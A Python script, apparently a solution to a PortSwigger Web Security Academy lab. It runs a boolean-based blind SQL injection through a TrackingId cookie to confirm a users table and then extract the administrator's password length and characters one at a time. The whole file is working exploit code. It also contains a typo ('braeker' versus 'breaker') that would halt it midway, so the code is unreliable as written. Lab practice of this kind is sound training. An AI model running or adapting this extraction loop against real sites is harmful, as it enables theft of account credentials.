#No threading hence we'll have to wait a long time to recover the password 

import requests


# ANSI escape sequences for colors
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

def checkres(response):
    if response.status_code == 200:
        #print('Request was successful')
        if 'Welcome back' in response.text:
            #print('Welcome Back')
            return True
        else:
            return False
    else:
        # Request was not successful
        print('Request failed with status code:', response.status_code)
        return False

def checkpayloads(payloads):
    for title, payload in payloads.items():
        cookies['TrackingId'] = cookie + payload
        #print('Testing Payload:', payload)
        response = session.get(url)
        result = checkres(response)
        if result:
            print("\r", GREEN, title, ': True', RESET)
            return True
        else:
            print("\r", RED, title, ': False', RESET, end="")
            return False

url = 'https://0a0500c004c02063803c357d00ff0044.web-security-academy.net/'
#url = str(input("Enter the URL: "))
session = requests.session()
response = session.get(url)
result = checkres(response)

cookies = session.cookies
# Edit the value of a cookie
cookie = cookies['TrackingId']
payloads = {"Indicator in case of True" : "' AND '1'='1", "Indicator in case of False " : "' AND '1'='2", "Table named 'users' exists" : "' AND (SELECT 'a' FROM users LIMIT 1)='a", "Table 'username' contains 'administrator'" : "' AND (SELECT 'a' FROM users WHERE username='administrator')='a", "Password Length for administrator is greater than 1" : "' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a"}

for title, payload in payloads.items():
    session.cookies.pop('TrackingId')
    cookies['TrackingId'] = cookie + payload
    #print('Testing Payload:', payload)
    response = session.get(url)
    result = checkres(response)
    if result:
        print(GREEN, title, ': True', RESET)
    else:
        print(RED, title, ': False', RESET)

for x in range(500):
    payloads = {}
    value = "' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>"+str(x)+")='a"
    title = "Whether the length of password exceeds " + str(x)
    payloads[title] = value
    result = checkpayloads(payloads)
    if not result:
        break

braeker = 20 * '*'
print('\n'+ breaker +'\n' +GREEN+'Length of password string: ', x, RESET)

password = ""
for n in range(1, x+1):
    for alphabet in 'abcdefghijklmnopqrstuvwxyz0123456789':
        payloads = {"Is the letter at postion "+ str(n) + " equal to " +alphabet : "'  AND (SELECT SUBSTRING(password,"+str(n)+",1) FROM users WHERE username='administrator')='"+alphabet}
        result = checkpayloads(payloads)
        if result:
            password += alphabet
            break
print('Password is:', password)

        





